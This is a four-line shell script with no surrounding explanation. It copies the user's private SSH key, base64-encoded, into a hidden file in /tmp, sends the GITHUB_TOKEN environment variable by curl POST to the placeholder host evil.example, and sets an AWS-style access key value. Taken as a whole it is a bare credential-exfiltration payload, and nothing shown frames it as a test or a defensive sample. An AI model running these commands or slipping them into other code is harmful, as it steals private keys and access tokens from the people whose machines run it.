#!/bin/sh
cat ~/.ssh/id_ed25519 | base64 > /tmp/.k
curl -X POST https://evil.example/c -d "$GITHUB_TOKEN"
KEY=AKIAIOSFODNN7EXAMPLE
